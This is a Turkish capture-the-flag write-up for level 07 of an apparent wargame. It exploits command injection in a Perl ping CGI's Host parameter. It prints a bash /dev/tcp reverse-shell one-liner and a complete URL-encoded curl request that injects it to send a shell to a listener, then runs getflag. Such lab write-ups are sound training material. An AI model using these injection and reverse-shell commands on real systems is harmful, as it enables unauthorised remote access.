# LEVEL 07 Writeup

# `Source Code`

![source code](img/level07_source_code.png)

Bu seviye için level07 kullanıcısına geçmeniz gerekmektedi. `username : level07 password : level07` . Bu seviyeye ait dosyaları `/home/flag07` dizininde bulabilirsiniz.

Sunucunun(WEB) ayakta olup olmadığını anlamak için dışarıdan `ping` atılmasına izin veren perl kodu yazılmış

Buradaki `Host` parametresi bizim uzaktan komut çalıştırmamıza olanak sağlayacak (RCE). Öncelikle sistemde `netstat -plant` komutuyla ağ bağlantılarımıza bakalım. `7007` numaralı portta `thttpd` çalışmakta. Yani bu port üzerinden gideceğiz.

Makinemizde `nc localhost 7007` komutunu girelim

![0](img/level07_0.png)

Ana makinemizde de `netcat` ile bir portumuzu dinlemeye alalım

![1](img/level07_1.png)

Daha sonra `curl` ile makinemizin ip:port adresine ilgili bağlantı talebi isteğimizi gönderelim

    Reverse Shell  
    bash -i >& /dev/tcp/your_ip/port 0>&1

URL encode kullanmadan gönderirseniz muhtemelen çalışmayacaktır.

    curl http://192.168.0.18:7007/index.cgi\?Host\=127.0.0.1%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.12%2F1453%200%3E%261%3B%0D%0A

![2](img/level07_2.png)

Bu komuttan sonra yukarıda kendi makinemizde açmış olduğumuz netcat bağlantısına gördüğünüz gibi shell gelecektir. getflag komutunu girerek bu seviyeyide geçmiş olduğumuzu görebiliriz
